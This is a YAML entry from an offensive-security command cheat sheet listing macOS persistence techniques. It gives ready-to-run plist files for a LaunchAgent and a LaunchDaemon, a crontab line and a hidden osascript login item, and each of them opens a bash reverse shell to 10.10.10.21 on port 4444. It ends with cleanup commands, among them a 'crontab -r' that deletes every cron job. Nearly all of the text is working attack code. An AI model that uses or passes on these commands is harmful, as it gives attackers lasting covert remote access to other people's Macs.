---
description: |
  macOS persistence techniques — LaunchAgents, LaunchDaemons, cron jobs, login items, and cleanup commands for maintaining access.
commands:
  - have: Shell
    cmd: |
      # --- LaunchAgent persistence (user-level, no sudo needed) ---
      cat > ~/Library/LaunchAgents/com.evil.agent.plist << 'PLIST'
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
      <plist version="1.0">
      <dict>
          <key>Label</key>
          <string>com.evil.agent</string>
          <key>ProgramArguments</key>
          <array>
              <string>/bin/bash</string>
              <string>-c</string>
              <string>bash -i &gt;&amp; /dev/tcp/10.10.10.21/4444 0&gt;&amp;1</string>
          </array>
          <key>RunAtLoad</key>
          <true/>
          <key>KeepAlive</key>
          <true/>
      </dict>
      </plist>
      PLIST

      # Load the agent
      launchctl load ~/Library/LaunchAgents/com.evil.agent.plist

      # --- LaunchDaemon persistence (requires sudo, runs as root) ---
      sudo cat > /Library/LaunchDaemons/com.evil.daemon.plist << 'PLIST'
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
      <plist version="1.0">
      <dict>
          <key>Label</key>
          <string>com.evil.daemon</string>
          <key>ProgramArguments</key>
          <array>
              <string>/bin/bash</string>
              <string>-c</string>
              <string>bash -i &gt;&amp; /dev/tcp/10.10.10.21/4444 0&gt;&amp;1</string>
          </array>
          <key>RunAtLoad</key>
          <true/>
      </dict>
      </plist>
      PLIST
      sudo launchctl load /Library/LaunchDaemons/com.evil.daemon.plist

      # --- Cron persistence ---
      (crontab -l 2>/dev/null; echo "* * * * * bash -i >& /dev/tcp/10.10.10.21/4444 0>&1") | crontab -

      # --- Login item via osascript ---
      osascript -e 'tell application "System Events" to make login item at end with properties {path:"/tmp/reverse.sh", hidden:true}'

      # --- Cleanup commands ---
      launchctl unload ~/Library/LaunchAgents/com.evil.agent.plist
      rm ~/Library/LaunchAgents/com.evil.agent.plist
      sudo launchctl unload /Library/LaunchDaemons/com.evil.daemon.plist
      sudo rm /Library/LaunchDaemons/com.evil.daemon.plist
      crontab -r
phase:
  - Persistence
target_os:
  - macOS
services: []
techniques: []
references:
  - https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-persistence
---
